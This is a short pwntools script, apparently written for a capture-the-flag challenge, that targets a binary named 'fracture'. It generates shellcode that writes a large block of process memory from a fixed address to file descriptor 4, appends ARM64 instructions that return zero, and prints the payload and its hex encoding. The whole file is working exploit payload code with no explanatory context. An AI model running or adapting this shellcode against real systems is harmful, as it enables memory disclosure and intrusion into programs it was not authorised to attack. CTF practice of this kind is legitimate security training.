from pwn import *

elf = context.binary = ELF("/home/kali/cybertalent/fracture")

shellcode = shellcraft.write(0x4, 0x00000055018238e0, 0xffff)
shellcode += """
    eor x0, x0, x0
    ret
"""

print(shellcode)
print(enhex(asm(shellcode)))